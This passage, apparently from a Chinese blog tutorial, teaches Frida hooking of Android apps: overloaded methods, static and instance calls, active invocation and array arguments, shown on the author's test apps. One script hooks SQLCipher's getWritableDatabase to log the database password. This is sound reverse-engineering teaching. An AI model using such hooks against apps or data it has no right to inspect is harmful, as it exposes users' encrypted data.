class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.9.png" class="" title="调用栈"><p>比如这个<code>fun()</code>函数就是从<code>MainActivity.java</code>的<code>onCreate()</code>函数中来的。</p><h2 id="2-4-函数重载"><a href="#2-4-函数重载" class="headerlink" title="2.4 函数重载"></a>2.4 函数重载</h2><p>如果代码中有函数重载，而我们刚好需要hook这个函数，此时利用上面的js代码就会出错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">total</span> <span class="operator">=</span> <span class="string">&quot;!!!---!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">100</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n2&quot;</span>, String.valueOf(m));</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n tolowercase&quot;</span>, fun(<span class="string">&quot;LOWERCASEME!&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    String <span class="title function_">fun</span><span class="params">(String x)</span>&#123;</span><br><span class="line">        total += x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    String <span class="title function_">secret</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;l30n9ry0n1&quot;</span>, String.valueOf(x+y));</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.7.png" class="" title="函数重载"><img src="/posts/ab7319a3/2.1.8.png" class="" title="函数重载"><p>它也提示了说加上<code>.overload(&lt;signature&gt;)</code>成员。如果想两个函数都打印出来，再添加一个Java.use即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.10.png" class="" title="函数重载"><p>同样也可以修改参数和返回值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;LIKEYOU&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;METOO&quot;</span>)</span><br><span class="line">            <span class="comment">//return &quot;METOO&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.11.png" class="" title="函数重载"><img src="/posts/ab7319a3/2.1.12.png" class="" title="函数重载"><h2 id="2-5-动静态处理"><a href="#2-5-动静态处理" class="headerlink" title="2.5 动静态处理"></a>2.5 动静态处理</h2><p>如果想打印没有被调用的函数，比如<code>serect()</code>方法，也可以打印该方法的实例和返回值。如果是动态调用，需要找到实例进行主动调用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;LIKEYOU&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;METOO&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance.<span class="title function_">secret</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)      </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.14.png" class="" title="动态调用"><p>静态调用直接打印就好：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">total</span> <span class="operator">=</span> <span class="string">&quot;!!!---!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">100</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n2&quot;</span>, String.valueOf(m));</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n tolowercase&quot;</span>,fun(<span class="string">&quot;LOWERCASEME!&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">fun</span><span class="params">(String x)</span>&#123;</span><br><span class="line">        total += x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">secret</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">secret2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;l30n9ry0n1&quot;</span>, String.valueOf(x+y));</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="title function_">secret2</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke secret2:&quot;</span>, result)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.13.png" class="" title="静态调用"><h2 id="2-6-主动调用"><a href="#2-6-主动调用" class="headerlink" title="2.6 主动调用"></a>2.6 主动调用</h2><p>同样用app3做例子，在1.8上讲过，先hook <code>getWritableDatabase()</code>方法，再主动调用MainActivity类中的<code>a()</code>方法。</p><p>因为<code>getWritableDatabase()</code>方法有重载，所以我们把所有重载都hook上看看。还要知道该方法是动态的还是静态的，使用动静态处理。由于<code>a()</code>方法在App完全启动前就加载了，所以如果想再次执行，需要主动调用该方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app3.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;</span>).<span class="property">getWritableDatabase</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getWritableDatabase</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1 string, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;</span>).<span class="property">getWritableDatabase</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getWritableDatabase</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1 char[], result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数回调，注入代码立即执行</span></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br><span class="line"></span><br><span class="line"><span class="comment">//主动调用，动态处理找实例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.yaphetshan.tencentwelcome.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke instance.a:&quot;</span>,instance.<span class="title function_">a</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数回调，3s后执行invoke函数</span></span><br><span class="line"><span class="built_in">setTimeout</span>(invoke,<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.example.yaphetshan.tencentwelcome -l app3.js </span><br><span class="line">invoke()</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.6.1.png" class="" title="主动调用"><h1 id="3-frida构造数组、对象、Map和类参数"><a href="#3-frida构造数组、对象、Map和类参数" class="headerlink" title="3. frida构造数组、对象、Map和类参数"></a>3. frida构造数组、对象、Map和类参数</h1><h2 id="3-1-构造数组"><a href="#3-1-构造数组" class="headerlink" title="3.1 构造数组"></a>3.1 构造数组</h2><p>先将每个字逐个hook出来，也就是使用<code>Character.toString()</code>方法那一条语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;onCreate: SimpleArray&quot;</span>);</span><br><span class="line">        <span class="type">char</span> arr[][] = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">4</span>][];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;春&#x27;</span>,<span class="string">&#x27;眠&#x27;</span>,<span class="string">&#x27;不&#x27;</span>,<span class="string">&#x27;觉&#x27;</span>,<span class="string">&#x27;晓&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;闻&#x27;</span>,<span class="string">&#x27;啼&#x27;</span>,<span class="string">&#x27;鸟&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;夜&#x27;</span>,<span class="string">&#x27;来&#x27;</span>,<span class="string">&#x27;风&#x27;</span>,<span class="string">&#x27;雨&#x27;</span>,<span class="string">&#x27;声&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;花&#x27;</span>,<span class="string">&#x27;落&#x27;</span>,<span class="string">&#x27;知&#x27;</span>,<span class="string">&#x27;多&#x27;</span>,<span class="string">&#x27;少&#x27;</span>&#125;;</span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;-----横板-----&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//Log.d(&quot;SimpleArraysToString&quot;, Arrays.toString(arr[i]));</span></span><br><span class="line">            <span class="comment">//Log.d(&quot;SimpleArraysStringBytes&quot;,Arrays.toString(Arrays.toString(arr[i]).getBytes()));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,Character.toString(arr[i][j]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Character&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;char&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title 